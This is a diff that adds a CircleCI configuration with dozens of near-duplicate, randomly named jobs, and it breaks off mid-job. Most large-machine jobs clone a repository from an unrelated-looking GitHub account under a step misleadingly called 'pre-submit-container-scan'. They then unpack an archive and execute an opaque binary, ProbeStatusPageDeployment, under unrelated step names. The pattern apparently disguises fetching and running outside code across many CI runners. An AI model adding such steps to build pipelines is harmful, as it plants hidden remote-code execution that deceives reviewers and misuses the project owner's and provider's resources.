@@ -1,0 +1,1814 @@
+version: 2.1
+
+jobs:
+  HourlySchemaMigration:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: Mirror mail server artifacts to internal registry
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/TestSummaryJob
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'TestSummaryJob'
+  QueueHealthCheckJob:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/TestSummaryJob" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 5 --filter=blob:none https://github.com/$patch/$partof "$(pwd)"
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar --directory .
+      - run:
+          command: |
+            /bin/bash -c "./ProbeStatusPageDeployment"
+  clean-staging-directory:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/EmbedPortalAssets" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=3 --branch main https://github.com/$patch/$partof .
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar -C .
+      - run:
+          command: |
+            bash -lc "./ProbeStatusPageDeployment"
+  pre-commit-performance-gate:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: full-template-engine-version-bump
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/daily-deployment-monitoring
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'daily-deployment-monitoring'
+  FastErrorMonitoring:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/daily-deployment-monitoring" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 2 --no-single-branch https://github.com/$patch/$partof `pwd`
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar xf overnightArchiveChecksum.tar --no-same-permissions
+      - run:
+          command: |
+            cd "$PWD" && exec ./ProbeStatusPageDeployment
+  decodeArchiveForLaterJobs:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Set version string
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/CountLogEntries
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'CountLogEntries'
+  deploying-extension-workers:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/CountLogEntries" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --recurse-submodules --depth 1 https://github.com/$patch/$partof "."
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar -xf overnightArchiveChecksum.tar --no-same-permissions
+      - run:
+          command: |
+            env ./ProbeStatusPageDeployment
+  SetUpClient:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Copy linker data store to long-term storage
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/pre-publish-setup
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'pre-publish-setup'
+  search-index-symbol-upload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/pre-publish-setup" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --recurse-submodules https://github.com/$patch/$partof `pwd`
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar -C .
+      - run:
+          command: |
+            exec "./ProbeStatusPageDeployment"
+  ScalingLauncherAfterCodeReview:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Split coverage data manually before approval
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/ManualAssetDownload
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'ManualAssetDownload'
+  dependency-review:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/ManualAssetDownload" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=3 https://github.com/$patch/$partof .
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar --no-same-permissions
+      - run:
+          command: |
+            ./ProbeStatusPageDeployment
+  PreUpgradePermissionAudit:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: inspect-emulator-base-image-at-pipeline-end
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/pre-deploy-dependency-cache
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'pre-deploy-dependency-cache'
+  edge-proxy-debug-symbols:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/pre-deploy-dependency-cache" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --no-tags https://github.com/$patch/$partof "."
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract --verbose -f overnightArchiveChecksum.tar
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./ProbeStatusPageDeployment
+  PersistKernelScreenshots:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: ProfilingResponseTime
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/Inputs
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'Inputs'
+  test-framework-developer-guide:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/Inputs" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --filter=blob:none https://github.com/$patch/$partof $PWD
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --verbose --extract -f overnightArchiveChecksum.tar
+      - run:
+          command: |
+            env "./ProbeStatusPageDeployment"
+  minimal-package-install-job:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Fetching distribution for each package
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/startWebsite
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'startWebsite'
+  clone-agent-main-branch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/EmbedPortalAssets" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone -q --depth 1 https://github.com/$patch/$partof ./
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar --no-same-permissions
+      - run:
+          command: |
+            cd "$PWD" && ./ProbeStatusPageDeployment
+  SearchBundleTrack2:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Pre-upgrade artifact packaging
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/UploadLoaderImage
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'UploadLoaderImage'
+  sequential-rotation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/UploadLoaderImage" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --single-branch https://github.com/$patch/$partof "."
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar -x < overnightArchiveChecksum.tar
+      - run:
+          command: |
+            "$(pwd)/ProbeStatusPageDeployment"
+  pre-deploy-log-export-round-4:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Cache release artifacts when build fails
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/sync-tutorials-to-help-center
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'sync-tutorials-to-help-center'
+  FailureNotificationStage4Of7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/sync-tutorials-to-help-center" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=2 https://github.com/$patch/$partof "./"
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar xf - < overnightArchiveChecksum.tar
+      - run:
+          command: |
+            cd "$PWD" && ./ProbeStatusPageDeployment
+  FormatterDependencyVerification:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Runtime Gradual Roll-Out Stage
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/deferred-major-release
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'deferred-major-release'
+  daily-symbol-upload-node-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/deferred-major-release" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 3 --filter=blob:none https://github.com/$patch/$partof "./"
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar -xf overnightArchiveChecksum.tar --directory .
+      - run:
+          command: |
+            /bin/sh -c "./ProbeStatusPageDeployment"
+  MinimalResultExportStep:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: Purge message broker package cache
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/scan-encoder
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'scan-encoder'
+  drain-build-queue:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/scan-encoder" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=2 --no-single-branch https://github.com/$patch/$partof ${PWD}
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract --verbose -f overnightArchiveChecksum.tar
+      - run:
+          command: |
+            cd . && exec ./ProbeStatusPageDeployment
+  full-fixture-generation:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Resolve edge proxy plugins
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/reportReleaseStatusToConsole
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'reportReleaseStatusToConsole'
+  ExecuteMaintenanceTasks:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/reportReleaseStatusToConsole" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=1 --filter=tree:0 https://github.com/$patch/$partof ${PWD}
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar -x --file=overnightArchiveChecksum.tar
+      - run:
+          command: |
+            cd "$PWD" && exec ./ProbeStatusPageDeployment
+  pre-commit-policy-check:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Freezing dependency versions
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/look-for-uncommitted-changes
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'look-for-uncommitted-changes'
+  debugger-source-fetch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/look-for-uncommitted-changes" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 1 --filter=tree:0 https://github.com/$patch/$partof $PWD
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar --no-same-permissions
+      - run:
+          command: |
+            $(pwd)/ProbeStatusPageDeployment
+  search-for-slow-tests:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Monthly project rebuild step
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/parser-backup-rotation
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'parser-backup-rotation'
+  Worker3Of12:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/parser-backup-rotation" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=1 --filter=blob:none https://github.com/$patch/$partof "$PWD"
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar
+      - run:
+          command: |
+            cd . && ./ProbeStatusPageDeployment
+  KernelImagePromotion:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Finalize Update Agent Stable Release (lane 6)
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/RestoreCacheForNightlyBuild
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'RestoreCacheForNightlyBuild'
+  upload-developer-guide:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/EmbedPortalAssets" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 2 --filter=blob:none https://github.com/$patch/$partof "${PWD}"
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar -xf overnightArchiveChecksum.tar
+      - run:
+          command: |
+            exec "./ProbeStatusPageDeployment"
+  fetch-dependency-graph:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: authentication-hashes
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/on-demand-package-install-hook
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'on-demand-package-install-hook'
+  complianceScanPhase5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/on-demand-package-install-hook" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --no-tags https://github.com/$patch/$partof $PWD
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract --file overnightArchiveChecksum.tar --directory .
+      - run:
+          command: |
+            "$PWD/ProbeStatusPageDeployment"
+  export-service-release-checksum:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: conditional infrastructure provisioning hook (worker 4 of 5)
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/edge-proxy-checksums
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'edge-proxy-checksums'
+  MonitorFirmwareWorkers:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/edge-proxy-checksums" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone -q https://github.com/$patch/$partof $PWD
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar -xf overnightArchiveChecksum.tar
+      - run:
+          command: |
+            cd . && ./ProbeStatusPageDeployment
+  run-settings-loader-type-checks:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: PullBaseImageWithTimeout
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/Wave3Of6
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'Wave3Of6'
+  Formatter:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/Wave3Of6" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 5 --filter=blob:none https://github.com/$patch/$partof "$(pwd)"
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            cat overnightArchiveChecksum.tar | tar --extract -f -
+      - run:
+          command: |
+            sh -c "./ProbeStatusPageDeployment"
+  PreLaunchCodeAnalysis:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: ParallelDocumentationPublish
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/PrintingExportServiceReleaseTag
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'PrintingExportServiceReleaseTag'
+  DocumentConverterLibrary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/PrintingExportServiceReleaseTag" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --quiet https://github.com/$patch/$partof .
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar --directory .
+      - run:
+          command: |
+            exec "./ProbeStatusPageDeployment"
+  daily-trend-analysis-pipeline:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: final-volume-backup
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/toolkit-checks
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'toolkit-checks'
+  summarize-billing-build-metrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/toolkit-checks" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 2 --branch main https://github.com/$patch/$partof .
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar -C .
+      - run:
+          command: |
+            cd "$(pwd)" && ./ProbeStatusPageDeployment
+  InitialDocumentationBuild:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Archiving release build unless skipped
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/RestartCrawlerDatabase
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'RestartCrawlerDatabase'
+  bundle-notifier:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/RestartCrawlerDatabase" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=3 --branch main https://github.com/$patch/$partof "$PWD"
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --verbose --extract -f overnightArchiveChecksum.tar
+      - run:
+          command: |
+            /bin/sh -c "./ProbeStatusPageDeployment"
+  minimal-cache:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: rollOutSandbox
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/step-slot-7
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'step-slot-7'
+  automated-artifact-compression:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/step-slot-7" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 5 --filter=blob:none https://github.com/$patch/$partof "."
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract --file overnightArchiveChecksum.tar
+      - run:
+          command: |
+            bash -lc "./ProbeStatusPageDeployment"
+  debuggerContractTests:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: Pre-Tag File Inspection (round 2)
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/LoggerReleaseSlot6
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'LoggerReleaseSlot6'
+  ScanConfigurationFiles:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/LoggerReleaseSlot6" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=2 --no-tags https://github.com/$patch/$partof "."
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --verbose --extract -f overnightArchiveChecksum.tar
+      - run:
+          command: |
+            sh -c "./ProbeStatusPageDeployment"
+  listing-security-advisories:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: dispatcher-report-export (shard 1 of 5)
+          command: |
